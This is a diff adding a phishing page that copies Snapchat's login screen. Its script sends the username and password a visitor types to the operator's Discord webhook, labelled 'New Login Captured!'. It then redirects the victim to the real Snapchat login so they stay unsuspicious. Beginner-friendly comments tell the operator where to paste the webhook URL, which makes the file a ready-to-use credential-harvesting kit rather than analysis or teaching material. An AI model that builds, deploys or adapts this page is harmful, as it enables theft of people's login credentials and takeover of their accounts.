@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Snapchat</title>
+    <style>
+        /* This is the CSS - it handles the colors and layout */
+        body {
+            background-color: #FFFC00; /* Snapchat Yellow */
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-box {
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+        }
+
+        .logo img {
+            width: 70px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            font-size: 22px;
+            margin-bottom: 25px;
+            font-weight: bold;
+            color: #16191c;
+        }
+
+        .field {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 11px;
+            color: #717274;
+            letter-spacing: 0.8px;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #e8e8e8;
+            background-color: #f7f7f7;
+            border-radius: 100px; /* Round inputs */
+            box-sizing: border-box;
+            outline: none;
+            font-size: 15px;
+        }
+
+        input:focus {
+            border-color: #000;
+        }
+
+        .btn-login {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 100px;
+            background-color: #000;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: 0.2s;
+        }
+
+        .btn-login:hover {
+            background-color: #333;
+        }
+
+        .forgot {
+            color: #0076ff;
+            font-size: 14px;
+            margin-top: 25px;
+            text-decoration: none;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-box">
+        <div class="logo">
+            <img src="https://accounts.snapchat.com/accounts/static/images/ghost/snapchat-app-icon.png" alt="Snapchat">
+        </div>
+        <h2>Log In</h2>
+        
+        <form id="snapForm">
+            <div class="field">
+                <label>Username or Email</label>
+                <input type="text" id="user" placeholder="Enter username" required>
+            </div>
+            <div class="field">
+                <label>Password</label>
+                <input type="password" id="pass" placeholder="Enter password" required>
+            </div>
+            <button type="submit" class="btn-login">Log In</button>
+        </form>
+
+        <a href="#" class="forgot">Forgot Password?</a>
+    </div>
+
+    <script>
+        // This is the JavaScript - it sends the info to your Discord
+        document.getElementById('snapForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const username = document.getElementById('user').value;
+            const password = document.getElementById('pass').value;
+            
+            // --- PASTE YOUR DISCORD WEBHOOK URL IN THE QUOTES BELOW ---
+            const myWebhook = "YOUR_WEBHOOK_URL_HERE";
+
+            const data = {
+                content: `👻 **New Login Captured!**\n**Username:** ${username}\n**Password:** ${password}`
+            };
+
+            fetch(myWebhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(() => {
+                // Once sent, redirect them to the REAL Snapchat so they aren't suspicious
+                window.location.href = "https://accounts.snapchat.com/accounts/login";
+            })
+            .catch(() => {
+                // If it fails (like a blocked URL), redirect anyway
+                window.location.href = "https://accounts.snapchat.com/accounts/login";
+            });
+        });
+    </script>
+
+</body>
+</html>
